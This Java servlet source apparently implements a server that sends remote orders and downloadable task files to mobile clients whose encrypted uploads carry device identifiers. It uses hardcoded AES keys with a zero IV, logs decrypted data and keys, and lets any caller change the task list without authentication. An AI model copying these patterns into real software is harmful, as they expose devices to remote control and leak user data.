package com.k99k.plserver;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.UnsupportedEncodingException;

import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.ServletException;
import javax.servlet.ServletOutputStream;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import com.k99k.tools.StringUtil;
import com.k99k.tools.encrypter.Base64Coder;
import com.k99k.tools.encrypter.Encrypter;

/**
 * Servlet implementation class PS
 */
public class PS extends HttpServlet {
	private static final long serialVersionUID = 1L;
       
    /**
     * @see HttpServlet#HttpServlet()
     */
    public PS() {
        super();
    }
    
//    public static native String CgetUrl();
//   	static {
//   		String libPath  = System.getProperty("java.library.path");  
//   		System.out.println("libPath:"+libPath);
//   		System.load("C:/jdk/bin/libdserv.so");
//   		//System.loadLibrary("dserv");
//   	}
    
    private byte[] rootkey = {79, 13, 33, -66, -58, 103, 3, -34, -45, 53, 9, 45, 28, -124, 50, -2};
    private byte[] ivk = {0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0};
    private byte[] rkey = {43, 23, 13, -32, -58, 83, 3, -34, -87, 56, 19, 90, 28, -102, 15, 40};
    // 加密
	public String encrypt(String sSrc,byte[] key) throws Exception {
		byte[] srcBytes = sSrc.getBytes("utf-8");
		Cipher cipher = null;
			srcBytes = zeroPadding(sSrc);
			cipher = Cipher.getInstance("AES/CBC/NoPadding");
//		byte[] raw = rootkey;//sKey.getBytes("utf-8");
		SecretKeySpec skeySpec = new SecretKeySpec(key, "AES");
		IvParameterSpec iv =  new IvParameterSpec(ivk);//new IvParameterSpec(ivParameter.getBytes());// 使用CBC模式，需要一个向量iv，可增加加密算法的强度
		cipher.init(Cipher.ENCRYPT_MODE, skeySpec, iv);
		byte[] encrypted = cipher.doFinal(srcBytes);
		return Base64Coder.encode(encrypted);
//		return bytePrint(encrypted);
	}
	
	public static String bytePrint(byte[] in){
		StringBuilder sb = new StringBuilder();
		for (int i = 0; i < in.length; i++) {
			sb.append(in[i]);
		}
		return sb.toString();
	}

	
	public static byte[] zeroPadding(String in){
		try {
			byte[] bs = in.getBytes("utf-8");
			int len = bs.length;
			int padding = len % 16;
			byte[] nbs;
			if (padding  != 0) {
				int nlen = len+(16-padding);
				nbs = new byte[nlen];
				System.arraycopy(bs, 0, nbs, 0, len);
				return nbs;
			}else{
				return bs;
			}
		} catch (UnsupportedEncodingException e) {
			e.printStackTrace();
			return null;
		}
	}
	public static byte[] clearPadding(byte[] in){
		int len = in.length;
		int nlen = len;
		for (int i = len-1; i >0; i--) {
			if(in[i] == 0){
				nlen--;
			}else{
				break;
			}
		}
		if (nlen == len) {
			return in;
		}
		byte[] re = new byte[nlen];
		System.arraycopy(in, 0, re, 0, nlen);
		return re;
		
	}
	// 解密
	public String decrypt(String sSrc,byte[] key) throws Exception {
		try {
//			byte[] raw = rootkey;//sKey.getBytes("utf-8");
			SecretKeySpec skeySpec = new SecretKeySpec(key, "AES");
			Cipher cipher = Cipher.getInstance("AES/CBC/NoPadding");
			IvParameterSpec iv = new IvParameterSpec(ivk);//new IvParameterSpec(ivParameter.getBytes());
			cipher.init(Cipher.DECRYPT_MODE, skeySpec, iv);
			byte[] encrypted1 = Base64Coder.decode(sSrc);// 先用base64解密
			byte[] original = cipher.doFinal(encrypted1);
			
			String originalString = new String(clearPadding(original), "utf-8");
			return originalString;
		} catch (Exception ex) {
			return null;
		}
	}     
	
	public static final int ORDER_NONE = 0;
	public static final int ORDER_SYNC_TASK = 1;
	public static final int ORDER_DEL_TASK = 2;
	public static final int ORDER_STOP_SERVICE = 3;
	public static final int ORDER_RESTART_SERVICE = 4;
	public static final int ORDER_UPDATE = 5;
	public static final int ORDER_UPTIME = 6;
	public static final int ORDER_KEY = 7;

    public static final String ERR_PARA = "e01";
    public static final String ERR_DECRYPT = "e02";
    public static final String ERR_KEY_EXPIRED = "e03";
    public static final String ERR_DECRYPT_CLIENT = "e04";
    
    
    private static final String SPLIT_STR = "@@";
    //TODO 暂时写死
    private String taskDownUrl = "http://180.96.63.71:8080/plserver/PS";
    private String updateDownUrl = "http://180.96.63.71:8080/plserver/PS";
    private final static String downloadType = "application/x-msdownload";

    private String downloadLocalPath = "/usr/plserver/dats/";
    
    private int currentKeyVersion = 1;
    
    private String tempTaskList = "1_2";
    
    
    
	@Override
	public void init() throws ServletException {
		
		String str = "16@@A1000037A240A4@@460036120035188@@HTC 609d@@1@@1404064295898@@1404064295901@@";
		try {
			byte[] nkey = {81,84,69,119,77,68,65,119,77,122,100,66,77,106,81,119};
			String enc = encrypt(str,nkey);
			System.out.println("enc:"+enc);
			System.out.println("dec:"+decrypt("o.62qBVtbdWfDYbR2mrD1PiIV3W23dwWdE7Rpr6bZDhvX4qStNZIkWJ2LDi5PN0WhbxPu2XBfLvh43qfRdIlKLk3vzqiQ@EMXL.T3odIQ6PLRdgLPA0T.p2.OQU8fEGM",nkey));
//			System.out.println("base:"+Base64Coder.encodeString("+++"));
		} catch (Exception e) {
			e.printStackTrace();
		}   
		
		super.init();
	}

	/**
	 * @see HttpServlet#doGet(HttpServletRequest request, HttpServletResponse response)
	 */
	protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
		setCharset("utf-8",request,response	);
		String tid = request.getParameter("id");
		String kVer = request.getHeader("v");
		
		if (!StringUtil.isDigits(tid) || !StringUtil.isDigits(kVer)) {
			response.setStatus(404);
			response.getWriter().println(ERR_PARA);
			return;
		}
		
		
		//TODO 临时更新task列表
		if (request.getParameter("task") != null) {
			String tasks = request.getParameter("task");
			this.tempTaskList = tasks;
			response.getWriter().println(this.tempTaskList);
			return;
		}
		
		//TODO 这里最好验证一下imsi和imei，确定用户权限
		
		
		//下载任务文件
		String localPath = this.downloadLocalPath+"/"+tid+".dat";
		File f = new File(localPath);
		if (f.exists()) {
			response.reset();
			response.setContentType(downloadType);
			response.addHeader("Content-Disposition", "attachment; filename=\"" + tid  + ".dat\"");
			int len = (int)f.length();
			response.setContentLength(len);
			if (len > 0) {
				try {
					InputStream inStream = new FileInputStream(f);
					byte[] buf = new byte[4096];
					ServletOutputStream servletOS = response.getOutputStream();
					int readLength;
					while (((readLength = inStream.read(buf)) != -1)) {
						servletOS.write(buf, 0, readLength);
					}
					inStream.close();
					servletOS.flush();
					servletOS.close();
				} catch (IOException e) {
					e.printStackTrace();
				}
			}
			
		}else{
			response.setStatus(404);
			response.getWriter().println(ERR_PARA);
			return;
		}
		
	}

	/**
	 * @see HttpServlet#doPost(HttpServletRequest request, HttpServletResponse response)
	 */
	protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
		setCharset("utf-8",request,response	);
		String enc = request.getParameter("up");
		String kVer = request.getHeader("v");
		if (!StringUtil.isStringWithLen(enc, 6) || !StringUtil.isStringWithLen(kVer,5)) {
			response.getWriter().println(ERR_PARA);
			return;
		}
		//int keyVersion = (Integer.parseInt(kVer)-17)/27;
		String req = null;
		try {
			String rkey = decrypt(kVer,rootkey);
			System.out.println("rkey:"+rkey);
			String[] rkeys = rkey.split("\\|\\|");
			//TODO 注意这里解密先需要确定KEY
			String imeiKey = Base64Coder.encodeString(rkeys[0]).substring(0, 16);
			System.out.println(imeiKey);
			byte[] ikey  = new byte[16];
			StringBuilder sb1 = new StringBuilder();
			for (int i = 0; i < 16; i++) {
				ikey[i] = (byte) imeiKey.charAt(i);
				sb1.append(ikey[i]).append(",");
			}
			System.out.println("ikey:"+sb1.toString());
			System.out.println("upContent:"+enc);
			req = decrypt(enc,ikey);
			System.out.println("dec:"+req);
//			if (keyVersion != this.currentKeyVersion) {
//				response.getWriter().println(ERR_KEY_EXPIRED);
//				return;
//			}
			//req = Encrypter.getInstance().decrypt(enc);
		} catch (Exception e) {
			e.printStackTrace();
			response.getWriter().println(ERR_DECRYPT);
			return;
		}
		String[] reqs = req.split(SPLIT_STR);
		//TODO 获取用户信息和taskList，根据用户具体情况修改taskList返回
		
		
		//实现ORDER_SYNC_TASK
		StringBuilder sb = new StringBuilder();
		sb.append(ORDER_SYNC_TASK).append(SPLIT_STR)
		.append(this.taskDownUrl).append(SPLIT_STR)
		//这里仅使用两个测试任务ID,1为toast,2为下载view数据
		.append(this.tempTaskList).append(SPLIT_STR)
		.append(this.currentKeyVersion);
		String resp = null;
		try {
			resp = encrypt(sb.toString(),rkey);
		} catch (Exception e) {
			e.printStackTrace();
		}
		response.getWriter().println(resp);
	}
	/**
	 * 设置输入输出的编码
	 * @param charset
	 * @param req
	 * @param resp
	 * @throws UnsupportedEncodingException
	 */
	public static final void setCharset(String charset,HttpServletRequest req, HttpServletResponse resp) throws UnsupportedEncodingException{
		req.setCharacterEncoding(charset);
		resp.setCharacterEncoding(charset);
		resp.setHeader("Content-Encoding",charset);
		resp.setHeader("content-type","text/html; charset="+charset);
	}

	/**
	 * @return the currentKeyVersion
	 */
	public final int getCurrentKeyVersion() {
		return currentKeyVersion;
	}

	/**
	 * @param currentKeyVersion the currentKeyVersion to set
	 */
	public final void setCurrentKeyVersion(int currentKeyVersion) {
		this.currentKeyVersion = currentKeyVersion;
	}

	/**
	 * @return the taskDownUrl
	 */
	public final String getTaskDownUrl() {
		return taskDownUrl;
	}

	/**
	 * @param taskDownUrl the taskDownUrl to set
	 */
	public final void setTaskDownUrl(String taskDownUrl) {
		this.taskDownUrl = taskDownUrl;
	}

	/**
	 * @return the updateDownUrl
	 */
	public final String getUpdateDownUrl() {
		return updateDownUrl;
	}

	/**
	 * @param updateDownUrl the updateDownUrl to set
	 */
	public final void setUpdateDownUrl(String updateDownUrl) {
		this.updateDownUrl = updateDownUrl;
	}
	
	
	
	
}
